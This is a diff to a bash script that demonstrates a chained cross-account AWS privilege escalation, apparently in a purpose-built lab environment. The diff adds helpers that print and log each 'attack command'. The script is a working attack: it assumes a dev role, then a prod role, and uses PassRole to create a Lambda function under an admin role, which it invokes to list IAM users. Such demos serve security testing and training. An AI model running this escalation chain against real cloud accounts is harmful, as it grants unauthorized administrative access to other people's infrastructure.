@@ -4,7 +4,28 @@
 # This script demonstrates multi-hop cross-account privilege escalation via PassRole to Lambda admin
 # Path: pl-pathfinding-starting-user-dev -> pl-lambda-prod-updater -> pl-lambda-updater -> pl-Lambda-admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 echo "🚀 Starting Cross-Account PassRole to Lambda Admin Attack Demo"
 echo "=============================================================="
@@ -27,12 +48,14 @@ echo "✅ AWS CLI and profile configured"
 # Step 1: Assume the dev lambda-prod-updater role
 echo ""
 echo "📋 Step 1: Assuming dev lambda-prod-updater role..."
+show_cmd aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text
 DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
 DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"
 
 echo "Assuming role: $DEV_ROLE_ARN"
 
 # Get temporary credentials for the dev role
+show_attack_cmd aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-prod-updater-session" --output json
 DEV_TEMP_CREDS=$(aws sts assume-role \
     --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
@@ -51,7 +74,7 @@ export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionTok
 export AWS_DEFAULT_REGION="us-west-2"
 
 echo "✅ Successfully assumed dev lambda-prod-updater role"
-    
+
 # Step 2: Get the prod account ID and assume the prod lambda-updater role
 echo ""
 echo "📋 Step 2: Getting prod account ID and assuming prod lambda-updater role..."
@@ -64,6 +87,7 @@ echo "Found prod account: $PROD_ACCOUNT_ID"
 echo "Assuming role: $PROD_ROLE_ARN"
 
 # Assume the prod role using current dev role credentials
+show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_ARN" --role-session-name "lambda-updater-prod-session" --output json
 PROD_TEMP_CREDS=$(aws sts assume-role \
     --role-arn "$PROD_ROLE_ARN" \
     --role-session-name "lambda-updater-prod-session" \
@@ -80,7 +104,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.Secre
 export AWS_SESSION_TOKEN=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SessionToken')
 
 echo "✅ Successfully assumed prod lambda-updater role"
-        
+
 # Step 3: Test PassRole privilege escalation
 echo ""
 echo "📋 Step 3: Testing PassRole privilege escalation..."
@@ -89,7 +113,7 @@ echo "We can now create a Lambda function that uses the Lambda-admin role."
 
 # Create a simple Lambda function that uses the admin role
 echo "Creating a Lambda function with admin role..."
-        
+
 # Create a simple Python function (Python runtime has boto3 built-in)
 cat > /tmp/lambda_function.py << 'EOF'
 import boto3
@@ -99,11 +123,11 @@ def lambda_handler(event, context):
     try:
         # Create IAM client to demonstrate admin access
         iam = boto3.client('iam')
-        
+
         # List all users to demonstrate admin access
         response = iam.list_users()
         users = response.get('Users', [])
-        
+
         return {
             'statusCode': 200,
             'body': json.dumps({
@@ -128,8 +152,9 @@ zip -q lambda_function.zip lambda_function.py
 # Get the Lambda admin role ARN
 LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-Lambda-admin"
 echo "Using Lambda admin role: $LAMBDA_ADMIN_ROLE_ARN"
-        
+
 # Create the Lambda function
+show_attack_cmd aws lambda create-function --function-name "pl-privesc-demo-\$(date +%s)" --runtime "python3.9" --role "$LAMBDA_ADMIN_ROLE_ARN" --handler "lambda_function.lambda_handler" --zip-file "fileb://lambda_function.zip" --output json
 LAMBDA_RESULT=$(aws lambda create-function \
     --function-name "pl-privesc-demo-$(date +%s)" \
     --runtime "python3.9" \
@@ -145,24 +170,25 @@ if [ $? -eq 0 ]; then
 
     # Sleep for 5 seconds
     sleep 5
-    
+
     # Step 4: Test the Lambda function
     echo ""
     echo "📋 Step 4: Testing the Lambda function..."
     echo "Invoking the Lambda function to test admin access..."
-            
+
+    show_attack_cmd aws lambda invoke --function-name "$FUNCTION_NAME" --payload '{}' /tmp/lambda_response.json --output json
     INVOKE_RESULT=$(aws lambda invoke \
         --function-name "$FUNCTION_NAME" \
         --payload '{}' \
         /tmp/lambda_response.json \
         --output json)
-    
+
     if [ $? -eq 0 ]; then
         echo "✅ Lambda function invocation completed"
         echo "Response:"
         cat /tmp/lambda_response.json | jq '.'
         echo ""
-        
+
         # Check if the function returned an error
         if cat /tmp/lambda_response.json | jq -e '.errorType' > /dev/null 2>&1; then
             echo "❌ Lambda function executed but there was an error"
@@ -181,13 +207,13 @@ if [ $? -eq 0 ]; then
             echo "Expected success message not found in response"
             ATTACK_SUCCESS=false
         fi
-        
+
     else
         echo "❌ Failed to invoke Lambda function"
         ATTACK_SUCCESS=false
     fi
-           
-                
+
+
 else
     echo "❌ Failed to create Lambda function with admin role"
     echo "This could be because:"
@@ -196,7 +222,7 @@ else
     echo "3. There are other policy restrictions"
     exit 1
 fi
-        
+
 # Clean up temporary files
 rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda_response.json
 
@@ -204,6 +230,13 @@ rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda_response.json
 unset AWS_ACCESS_KEY_ID
 unset AWS_SECRET_ACCESS_KEY
 unset AWS_SESSION_TOKEN
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n\033[1;33mAttack Commands:\033[0m"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo ""
 if [ "$ATTACK_SUCCESS" = "true" ]; then
